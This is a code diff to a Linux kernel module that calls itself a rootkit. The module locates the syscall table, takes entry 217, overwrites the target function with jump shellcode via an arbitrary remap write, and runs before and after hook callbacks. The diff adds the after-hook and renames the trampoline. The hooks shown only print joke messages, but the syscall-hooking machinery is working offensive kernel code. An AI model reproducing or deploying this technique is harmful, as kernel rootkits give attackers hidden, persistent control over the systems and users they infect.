@@ -24,7 +24,7 @@ struct hook_context{
     struct pt_regs regs;
     void (* orig_func)(size_t, size_t, size_t, size_t, size_t, size_t);
     void (* hook_before)(struct pt_regs *);
-    void (* hook_after)(struct pt_regs *, size_t );
+    void (* hook_after)(struct pt_regs *);
 };
 
 /* 用来存放hook上下文 */
@@ -92,18 +92,13 @@ static void funny_joke(struct pt_regs * regs){
 }
 
 
+static void poor_joke(struct pt_regs * regs){
+    printk(KERN_INFO "[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;(");
+}
 
-//void (*evil_func)(void);
 
-    /*
-    void (*evil_func) (void)  = (void (*)(void))hooker_addr;
 
-    evil_func();
-
-    arbitrary_remap_write((void *)(hooked_addr), orig_code, count);
-    */
-
-static size_t hook_king(void){
+static size_t do_hook(void){
     asm volatile(
         "subq $0x100, %%rsp;"
         "movq %%rax, %0;"
@@ -137,6 +132,8 @@ static size_t hook_king(void){
     /* 恢复内容 */
     arbitrary_remap_write((void *)temp_hook_ctx.orig_func, temp_hook_ctx.orig_code, temp_hook_ctx.shellcode_nr);
 
+
+    /* 调用原函数 */
     asm volatile(
         "movq %1, %%rax;"
         "movq %2, %%rbx;"
@@ -166,7 +163,8 @@ static size_t hook_king(void){
           "m"(temp_hook_ctx.regs.r15), "m"(temp_hook_ctx.orig_func)
         : 
     );
-    //temp_hook_ctx.orig_func(temp_hook_ctx.regs.di, temp_hook_ctx.regs.si, temp_hook_ctx.regs.dx, temp_hook_ctx.regs.cx, temp_hook_ctx.regs.r8, temp_hook_ctx.regs.r9);
+    temp_hook_ctx.hook_after(&(temp_hook_ctx.regs));
+
     /* 重新hook */
     arbitrary_remap_write((void *)temp_hook_ctx.orig_func, temp_hook_ctx.hook_code, temp_hook_ctx.shellcode_nr);
     return temp_hook_ctx.ret;
@@ -182,7 +180,7 @@ static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t coun
 static size_t orig_code[SHELLCODE_MAX_NR] = {0};
 static u8 shell_code[SHELLCODE_MAX_NR] = {0};
 
-static ssize_t orig_modifier(size_t orig_func, size_t hook_before){
+static ssize_t orig_modifier(size_t orig_func, size_t hook_before, size_t hook_after){
     size_t shellcode_nr;
     size_t index;
     size_t *share_orig;
@@ -190,11 +188,10 @@ static ssize_t orig_modifier(size_t orig_func, size_t hook_before){
     size_t hook_ctl;
     /* 保存hook函数 */
     temp_hook_ctx.hook_before = (void (*)(struct pt_regs *))hook_before;
-    temp_hook_ctx.hook_after = NULL;
+    temp_hook_ctx.hook_after = (void (*)(struct pt_regs *))hook_after;
     temp_hook_ctx.orig_func = (void (*)(size_t, size_t, size_t, size_t, size_t, size_t))orig_func;
 
-    hook_ctl = (size_t)hook_king;
-
+    hook_ctl = (size_t)do_hook;
 
     // jmp 0x*
     shellcode_nr = sizeof(u8) + sizeof(size_t);
@@ -239,8 +236,7 @@ static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long
             sys_call_table_finder();
             hooked_addr = ((size_t *)syscall_table_addr)[217];
             //orig_modifier(hooked_addr, (size_t)&funny_joke);
-            orig_modifier((size_t)hooked_addr, (size_t)&funny_joke);
-            //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
+            orig_modifier((size_t)hooked_addr, (size_t)&funny_joke, (size_t)poor_joke);
             break;
         default:
             break;
